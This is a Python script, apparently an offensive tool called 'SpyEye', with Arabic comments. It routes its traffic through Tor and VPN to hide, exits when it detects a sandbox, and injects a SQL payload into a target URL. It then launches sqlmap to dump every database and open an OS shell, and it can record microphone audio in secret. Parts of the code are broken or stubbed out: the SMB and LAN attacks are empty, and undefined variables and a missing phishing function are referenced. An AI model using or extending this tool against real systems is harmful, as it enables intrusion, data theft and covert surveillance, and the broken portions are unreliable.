import socket
import threading
import os
import time
import requests
import subprocess
import base64
from Crypto.Cipher import AES
import random
import string
import logging
import sqlite3
import socks
import ssl
import sys
import platform
import urllib.request
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse
from impacket import smb
import json
import re
import hashlib
import nmap
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera

# إعدادات السجل
logging.basicConfig(filename='spyeye_log.txt', level=logging.DEBUG)

# إعدادات VPN و Tor و Proxy Chains للتخفي
def use_tor_and_vpn():
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    subprocess.run("openvpn --config myconfig.ovpn", shell=True)
    subprocess.run("openvpn --config another_vpn_config.ovpn", shell=True)

# دالة لتوليد مفتاح AES باستخدام PBKDF2
def generate_aes_key():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

# دالة لتشفير البيانات باستخدام AES
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return cipher.nonce + tag + ciphertext

# تمويه حركة المرور عبر HTTPS + Obfuscated Headers
def obfuscated_http_request(target_ip, target_port):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Authorization": "Bearer " + base64.b64encode(b"FakeTokenForRequest").decode(),
        "X-Forwarded-For": target_ip,
        "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    }
    request_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n" + "\r\n".join([f"{key}: {value}" for key, value in headers.items()])
    encrypted_message = base64.b64encode(request_data.encode())
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(encrypted_message)
        logging.info(f"[INFO] Sent obfuscated HTTPS request to {target_ip}:{target_port}")

# التحقق مما إذا كان السكربت يعمل في بيئة مراقبة (مثل Sandbox)
def detect_sandbox():
    if os.path.exists("/proc/self/status"):
        with open("/proc/self/status", "r") as f:
            content = f.read()
            if "TracerPid" in content and "PID" in content:
                print("[INFO] Detected sandbox environment")
                exit(1)  # الخروج إذا كان في بيئة مراقبة

# طلب إذن من المستخدم عند اكتشاف ثغرة
def request_permission_for_exploit(vulnerability_type):
    response = input(f"[INFO] {vulnerability_type} vulnerability detected. Do you want to exploit it? (y/n): ").lower()
    if response == 'y':
        print("[INFO] Exploiting vulnerability...")
        return True
    else:
        print("[INFO] Exploit aborted.")
        return False

# دالة لاكتشاف SQL Injection
def detect_sql_injection(url, payload):
    try:
        response = requests.get(url + payload, headers={"User-Agent": "Mozilla/5.0"})
        if "error" in response.text or "sql" in response.text:
            logging.info(f"SQL Injection vulnerability detected: {url + payload}")
            if request_permission_for_exploit("SQL Injection"):
                return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SQL Injection test: {e}")
    return False

# دالة لفحص ما إذا كان النص عنوان IP أم URL
def is_ip_address(string):
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, string))

# إضافة جلب التحديثات الأمنية
def update_script():
    subprocess.run("git pull origin main", shell=True)
    print("[INFO] Script updated successfully.")

# دالة لاختراق SMB
def exploit_smb(target_ip):
    print(f"[INFO] Attempting SMB exploit on {target_ip}")
    # تنفيذ الكود الخاص باختراق SMB

# دالة لاكتشاف هجوم الشبكة المحلية
def lan_attack(target_ip):
    print(f"[INFO] Starting LAN attack on {target_ip}")
    # الكود الخاص بهجوم الشبكة المحلية هنا

# إعداد المدخلات عبر argparse
def main():
    # اكتشاف بيئة مراقبة
    detect_sandbox()

    # إعداد argparse لمدخل واحد فقط
    parser = argparse.ArgumentParser(description="SpyEye Tool - Network and Security Scanner")
    parser.add_argument('target', type=str, help="Enter target IP address or URL")
    args = parser.parse_args()

    target = args.target
    print(f"[INFO] Target entered: {target}")

    # فحص ما إذا كان المدخل عنوان IP أو URL
    if is_ip_address(target):
        print(f"[INFO] Detected IP address: {target}")
        exploit_smb(target)  # تنفيذ الهجوم عبر SMB على الـ IP
        lan_attack(target)    # بدء هجوم على الشبكة المحلية (LAN)
    elif re.match(r"https?://", target):
        print(f"[INFO] Detected URL: {target}")
        detect_sql_injection(target, "' OR 1=1")  # فحص SQL Injection عبر الـ URL
    else:
        print("[ERROR] Invalid input! Please enter a valid IP address or URL.")

    # تشغيل SQLMap
    def run_sqlmap():
        sqlmap_command = [
            "sqlmap", "-u", f"http://{target}/vulnerable.php?id=1 OR 1=1", 
            "--batch", "--level=5", "--risk=3", 
            "--tamper=space2comment,charencode,randomcase,between", 
            "--random-agent", "--crawl=10", "--threads=10", 
            "--technique=BEUSTQ", "--time-sec=10", "--output-dir=sqlmap_output", 
            "--dbs", "--dump-all", "--forms", "--smart", "--os-shell"
        ]
        subprocess.run(sqlmap_command)

    # تشغيل TestSSL.sh
    def run_testssl():
        testssl_command = [
            "sudo", "./testssl.sh", "--vulnerable", "--severity", "HIGH", "--full", 
            "--sneaky", "--show-each", "--wide", "--color", "3", 
            "--json-pretty", "--html", "--logfile", "deep_scan_result.log", 
            "--assume-http", "--ids-friendly", "--debug", "6", "--openssl", "/usr/bin/openssl", 
            "--connect-timeout", "5", "--openssl-timeout", "5", 
            f"https://{target}"
        ]
        subprocess.run(testssl_command)

    # تشغيل الأدوات
    run_sqlmap()
    run_testssl()

# إضافة واجهة التحكم
def attack_configurations():
    attack_type = input("Select attack type (1: SMB, 2: SQL Injection, 3: Phishing): ")
    if attack_type == "1":
        exploit_smb(target_ip)
    elif attack_type == "2":
        detect_sql_injection(target_url, "' OR 1=1")
    elif attack_type == "3":
        phishing_attack(target_email)
    else:
        print("[ERROR] Invalid selection.")

# إضافة تسجيل الصوت باستخدام PyAudio
def record_audio(duration=10):
    print("[INFO] Starting audio recording...")
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for i in range(0, int(44100 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)
    print("[INFO] Audio recording complete.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    
    # حفظ الصوت المسجل
    with wave.open("recorded_audio.wav", 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

# الدالة الرئيسية
if __name__ == "__main__":
    main()
